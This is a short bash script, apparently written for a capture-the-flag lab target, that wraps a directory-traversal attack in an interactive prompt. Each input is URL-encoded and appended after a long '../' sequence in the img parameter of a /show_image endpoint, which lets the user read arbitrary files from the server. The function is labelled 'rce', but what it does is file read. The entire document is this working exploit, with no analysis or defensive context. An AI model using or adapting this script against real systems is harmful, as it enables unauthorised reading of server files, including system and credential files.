#!/bin/bash

function rce() {
        echo "To exit kindly use CTRL + C"
        while true; do
        echo -n "Shell>> "; read cmd
        ecmd=$(echo -n $cmd | jq -sRr @uri)
        curl -s -o - "http://10.129.177.221:8080/show_image?img=../../../../../../../../${ecmd}"
        echo ""
        done
        }
rce
